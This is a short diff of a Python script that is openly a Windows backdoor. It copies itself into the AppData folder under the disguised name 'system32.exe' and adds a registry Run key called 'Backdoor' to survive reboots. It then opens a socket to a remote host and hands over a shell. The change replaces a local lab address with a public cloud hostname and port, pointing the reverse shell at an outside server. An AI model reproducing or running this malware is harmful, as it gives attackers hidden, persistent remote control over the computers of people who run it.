@@ -77,9 +77,11 @@ location  = os.environ["appdata"] + "\\system32.exe"
 if not os.path.exists(location):
   shutil.copyfile(sys.executable,location)
   subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location +'"', shell=True)
+HOST = 'ec2-100-20-118-82.us-west-2.compute.amazonaws.com'
+PORT = 54436
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("10.0.2.15",54436))
-
+#sock.connect(('100.20.118.82', 54436))
+sock.connect((HOST, PORT))
 shell()
 
 sock.close()
